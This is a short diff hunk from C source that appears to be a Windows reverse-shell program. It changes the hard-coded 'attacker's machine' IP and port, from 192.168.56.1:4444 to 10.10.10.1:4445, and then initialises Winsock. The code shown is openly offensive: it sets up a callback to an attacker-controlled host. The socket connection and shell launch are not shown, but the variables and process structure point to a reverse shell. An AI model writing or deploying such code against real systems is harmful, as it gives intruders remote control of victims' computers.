@@ -15,8 +15,8 @@ PROCESS_INFORMATION pi;
 
 int main(int argc, char* argv[]) {
   // IP and port details for the attacker's machine
-  char *attackerIP = "192.168.56.1";
-  short attackerPort = 4444;
+  char *attackerIP = "10.10.10.1";
+  short attackerPort = 4445;
 
   // initialize socket library
   WSAStartup(MAKEWORD(2, 2), &socketData);
